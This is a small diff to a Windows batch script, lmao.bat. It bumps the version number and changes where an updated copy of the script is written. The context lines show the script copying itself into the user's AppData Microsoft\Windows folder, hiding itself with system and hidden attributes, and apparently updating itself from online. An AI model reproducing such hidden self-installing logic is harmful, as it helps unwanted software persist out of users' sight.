@@ -1,4 +1,4 @@
-REM DBGVersion 7.9
+REM DBGVersion 8.0
 @echo off
 echo init begin
 
@@ -245,7 +245,7 @@ del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s -h lmao.bat
 if %UpdatedFromOnline%==False (
 xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
-) else (xcopy "%NewVer%.bat" "%appdata%\Microsoft\Windows\" /y >nul 2>&1)
+) else (xcopy "%NewVer%.bat" "%appdata%\Microsoft\Windows\lmao.bat" /y >nul 2>&1)
 
 attrib +s +h lmao.bat
 echo new lmao.bat installed
